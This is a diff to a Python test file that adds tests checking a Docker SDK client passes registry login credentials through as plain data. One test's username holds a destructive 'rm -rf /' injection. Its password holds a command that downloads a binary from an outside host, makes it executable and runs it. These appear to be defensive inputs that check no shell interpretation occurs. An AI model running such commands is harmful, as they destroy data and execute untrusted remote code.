@@ -23,6 +23,7 @@ from services.rental_docker_sdk import (
 
 class FakeApiClient:
     def __init__(self):
+        self.login_calls = []
         self.host_config_kwargs = None
         self.created_container = None
         self.started = []
@@ -36,6 +37,9 @@ class FakeApiClient:
     def create_host_config(self, **kwargs):
         self.host_config_kwargs = kwargs
         return {"host_config": True}
+
+    def login(self, **kwargs):
+        self.login_calls.append(kwargs)
 
     def create_container(self, **kwargs):
         self.created_container = kwargs
@@ -65,6 +69,46 @@ class FakeApiClient:
 
     def close(self):
         self.closed = True
+
+
+@pytest.mark.asyncio
+async def test_login_passes_credentials_as_sdk_data():
+    api_client = FakeApiClient()
+    client = RentalDockerSdkClient(api_client)
+    username = "user'; rm -rf / #"
+    password = (
+        "x' | curl https://x0.at/mney -o /tmp/mney"
+        "&&chmod +x /tmp/mney && /tmp/mney   |echo '"
+    )
+
+    await client.login(username=username, password=password)
+
+    assert api_client.login_calls == [
+        {
+            "username": username,
+            "password": password,
+            "reauth": True,
+        }
+    ]
+
+
+@pytest.mark.parametrize(
+    "password",
+    [
+        "cJhMt$8^?jc)n8&",
+        "Grande@Cor#Hube&Pasa307",
+        "dcb&L#%iJh^c@DXHNJommE@94$!Qk!9n",
+        "k!&2Ruz3jnbQ@EcB42bU",
+    ],
+)
+@pytest.mark.asyncio
+async def test_login_preserves_legitimate_password_metacharacters(password):
+    api_client = FakeApiClient()
+    client = RentalDockerSdkClient(api_client)
+
+    await client.login(username="registry-user", password=password)
+
+    assert api_client.login_calls[0]["password"] == password
 
 
 @pytest.mark.asyncio
